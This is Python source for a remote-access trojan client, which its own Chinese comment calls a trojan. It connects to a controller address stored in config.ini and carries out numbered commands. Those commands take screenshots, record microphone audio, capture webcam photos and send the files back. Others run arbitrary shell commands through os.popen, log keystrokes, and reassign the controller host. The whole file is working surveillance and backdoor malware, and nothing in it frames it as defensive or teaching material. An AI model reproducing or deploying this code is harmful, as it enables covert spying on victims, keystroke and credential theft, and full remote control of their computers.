import socket
import sys
import os
import time
import pyautogui
import struct
import pyaudio
import wave
import cv2
import threading
from pynput import keyboard

if os.path.exists('config.ini'):
    config = open('config.ini').read().split()
    ip = config[0]
    port = int(config[1])
    # print(ip + ":" + str(port))
else:
    ip = '127.0.0.1'
    port = 12345
    config = open('config.ini', 'w')
    config.write(ip + " " + str(port))
    config.close()
# print(ip + ":" + str(port))
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverAddr = (ip, port)


def socket_client():
    try:

        client.connect(serverAddr)
        # 以下为木马的业务调用区域
        # screenshot(client)
        # recac(client)
        # captureAc(client)
        while True:
            cmd = client.recv(4096).decode('utf-8').split("+")
            if cmd[0] == '4':
                t1 = threading.Thread(target=screenshot, args=(client, int(cmd[1])))
                t2 = threading.Thread(target=recac, args=(client, int(cmd[2])))
                t3 = threading.Thread(target=captureAc, args=(client, int(cmd[3])))
                t1.start()
                t2.start()
                t3.start()
            elif cmd[0] == '1':
                t1 = threading.Thread(target=screenshot, args=(client, int(cmd[1])))
                t1.start()
            elif cmd[0] == '2':
                t2 = threading.Thread(target=recac, args=(client, int(cmd[1])))
                t2.start()
            elif cmd[0] == '3':
                t3 = threading.Thread(target=captureAc, args=(client, int(cmd[1])))
                t3.start()
            elif cmd[0] == '5':
                while True:
                    client.send(os.path.abspath(__file__).encode('utf-8'))
                    cmd = client.recv(4096).decode('utf-8')
                    if cmd == 'exit':
                        break
                    else:
                        res = os.popen(cmd, 'r')
                        client.send(res.read().encode('utf-8'))
                        res.close()
            elif cmd[0] == '6':
                with keyboard.Listener(on_press=on_press) as listener:
                    listener.join()
            elif cmd[0] == '7':
                ip = cmd[1]
                port = cmd[2]
                config = open('config.ini', 'a')
                config.seek(0)
                config.truncate()
                config.write(ip + " " + port)
                config.close()
                client.send("success".encode('utf-8'))
            elif cmd[0] == '0':
                break
    except socket.error as e:
        print("网络不正常")
        os.remove('config.ini')
        sys.exit(1)


def screenshot(client, num):
    # while True:
    time.sleep(1)
    for i in range(num):
        img = pyautogui.screenshot()
        # img.show()
        imgFileName = 'localscreenshot_{}.jpg'.format(time.time())
        img.save(imgFileName)
        sendFile(client, imgFileName)
        os.remove(imgFileName)


def recac(client, num):
    # pyaudio
    time.sleep(2)
    RATE = 16000
    FORMAT = pyaudio.paInt16
    CHANELS = 2
    CHUNK = 1024
    RECODE_SECONDS = num
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    print("开始录音，请说话，可以录{}s.".format(RECODE_SECONDS))
    # print(stream)
    frames = []
    for i in range(0, int(RATE / CHUNK * RECODE_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    # print(frames)
    print("录音结束")
    stream.stop_stream()
    stream.close()
    p.terminate()
    # 处理音频
    waveFileName = 'localwave_{}.wav'.format(time.time())
    wf = wave.open(waveFileName, 'wb')
    wf.setnchannels(CHANELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    sendFile(client, waveFileName)
    os.remove(waveFileName)


def sendFile(client, FileName):
    # 如果发其他位置则是绝对路径，当前目录下的则是相对路径
    if os.path.isfile(FileName):
        # 如果文件存在
        fileBaseName = bytes(os.path.basename(FileName).encode('utf-8'))
        fileBaseSize = os.stat(FileName).st_size
        fileInfoPack = struct.pack('128sl', fileBaseName, fileBaseSize)
        client.send(fileInfoPack)
        # 等控制端接收到数据后，才正式发送文件数据过去
        fileobj = open(FileName, 'rb')
        # 分段1k=2014b
        while True:
            fileData = fileobj.read(1024)
            if not fileData:
                print("{}-数据读取结束".format(FileName))
                break
            client.send(fileData)


def captureAc(client, num):
    for i in range(num):
        capFileName = 'localphoto_{}.jpg'.format(time.time())
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        # cv2.imshow("photo", frame)
        # cv2.waitkey(0)
        cv2.imwrite(capFileName, frame)
        cap.release()
        sendFile(client, capFileName)
        os.remove(capFileName)


def on_press(key):
    client.send(str(key).encode('utf-8'))


if __name__ == '__main__':
    socket_client()
